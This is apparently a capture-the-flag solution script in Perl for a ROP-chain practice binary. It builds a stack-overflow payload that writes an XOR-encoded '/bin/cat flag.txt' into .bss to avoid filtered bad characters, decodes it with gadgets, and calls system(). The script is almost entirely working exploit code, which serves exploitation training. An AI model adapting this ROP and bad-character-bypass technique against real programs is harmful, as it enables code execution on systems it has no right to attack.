# Plan B is to write our string to bss after we xored bad chars with some byte
# that won't produce badchars and then xor it again against the same byte using a
# gadget. This allows us to produce an even smaller ROP chain than with plan A
# by using the same byte to xor everything.
use strict;
use warnings;

my %BADCHARS = (
	' ' => 1,
	'/' => 1,
	'b' => 1,
	'c' => 1,
	'f' => 1,
	'i' => 1,
	'n' => 1,
	's' => 1,
);


my $PADDING  = "B"x40;
my $BSS      = "\x80\x10\x60\x00" . "\0"x4; # BSS section
my $CALLSYS  = "\xe8\x09\x40\x00" . "\0"x4; # call to system()
my $POPRDI   = "\x39\x0b\x40\x00" . "\0"x4; # pop rdi

my $ALLIGN  = 8;
my $XORBYTE = 0xBB;

sub xor_memory
{
	my ($addr, $string) = @_;

	my $r14_is_set = 0;

	my $rop = "";
	for my $char (split //, $string)
	{
		if ($BADCHARS{$char})
		{
			# The first xor must set both r14 and r15
			if (not $r14_is_set)
			{
				$r14_is_set = 1;
				$rop .= "\x40\x0b\x40\x00" . "\0"x4; # pop r14; pop r15
				$rop .= pack("QQ", $XORBYTE, $addr);
			}

			# The remaining XORs can only set r15 and reuse the previous
			# value for r14, thus keeping the ROP chain short.
			else
			{
				$rop .= "\x42\x0b\x40\x00" . "\0"x4; # pop r15
				$rop .= pack("Q", $addr);
			}

			$rop .= "\x30\x0b\x40\x00" . "\0"x4; # xor byte [r15], r14b
		}

		$addr++;
	}

	$rop;
}

sub xor_badchars
{
	my ($string) = @_;
	join(
		"",
		map { $BADCHARS{$_} ? chr(ord($_) ^ $XORBYTE) : $_ }
			(split //, $string)
	);
}

sub write_bytes
{
	my ($addr, $string) = @_;

	my $mod = (length $string) % $ALLIGN;
	if ($mod ne 0) {
		$string .= "\x00" x ($ALLIGN - $mod);
	}

	my $rop = "";
	for my $str (unpack("(a$ALLIGN)*", $string))
	{
		$rop .= "\x3b\x0b\x40\x00" . "\0"x4; # pop r12; pop r13
		$rop .= $str;
		$rop .= pack("Q", $addr);
		$rop .= "\x34\x0b\x40\x00" . "\0"x4; # mov qword [r13], r12
		$addr += $ALLIGN;
	}

	$rop;
}


my $str = "/bin/cat flag.txt\0";

# 360 bytes
print $PADDING
	. write_bytes(0x601080, xor_badchars($str)) # write @bss
	. xor_memory(0x601080, $str)
	. $POPRDI . $BSS
	. $CALLSYS;
